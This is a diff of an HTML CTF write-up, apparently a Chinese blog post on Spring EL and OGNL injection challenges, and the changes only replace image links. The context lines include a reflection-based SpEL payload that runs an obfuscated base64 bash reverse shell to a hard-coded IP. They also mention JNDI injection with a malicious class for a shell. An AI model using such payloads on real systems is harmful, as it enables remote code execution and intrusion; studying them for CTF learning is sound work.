@@ -205,7 +205,7 @@
 <p>既然字符串被过滤，那么反射forName绕一下就好了(下面payload填在大括号里)</p>
 <p><code>&quot;&quot;.getClass().forName(&quot;java.lang.Run&quot;+&quot;time&quot;).getMethod(&quot;exec&quot;, &quot;&quot;.getClass()).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Run&quot;+&quot;time&quot;).getMethod(&quot;getRun&quot;+&quot;time&quot;).invoke(&quot;&quot;.getClass().forName(&quot;java.lang.Run&quot;+&quot;time&quot;)),&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjAxLjE2My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&quot;)</code></p>
 <p>但是没反应。放到上面的@Value测试以下会发现报这个错。</p>
-<p><img src="https://img2022.cnblogs.com/blog/2662112/202205/2662112-20220515121044259-456198215.png" alt="image"></p>
+<p><img src="https://s2.loli.net/2022/11/01/M1nuftjxmSHlD2c.png" alt=""></p>
 <p>进一步测试，执行curl xxx.dnslog.cn是可行的，直接java运行上面的反射代码也是可行的，但是放在SpringEL里就是不行。（没有进一步debug</p>
 <p>另换一个思路，直接动态加载字节码。</p>
 <p><a href="https://blog.csdn.net/mole_exp/article/details/122768814">https://blog.csdn.net/mole_exp/article/details/122768814</a></p>
@@ -301,7 +301,7 @@
 <p>这里是OGNL表达式，和上面的SpringEL其实大同小异.贴一下官方文档</p>
 <p><a href="https://commons.apache.org/proper/commons-ognl/language-guide.html">https://commons.apache.org/proper/commons-ognl/language-guide.html</a></p>
 <p>但是题目是有waf的</p>
-<p><img src="https://img2022.cnblogs.com/blog/2662112/202205/2662112-20220516111055873-1202706099.png" alt="image"></p>
+<p><img src="https://s2.loli.net/2022/11/01/XAIWz3r24Ce5HVv.png" alt=""></p>
 <p>第一种思路，用上面payload的jndi注入。</p>
 <p>jndi服务用marshalsec来搭</p>
 <p>写一个恶意类弹shell</p>
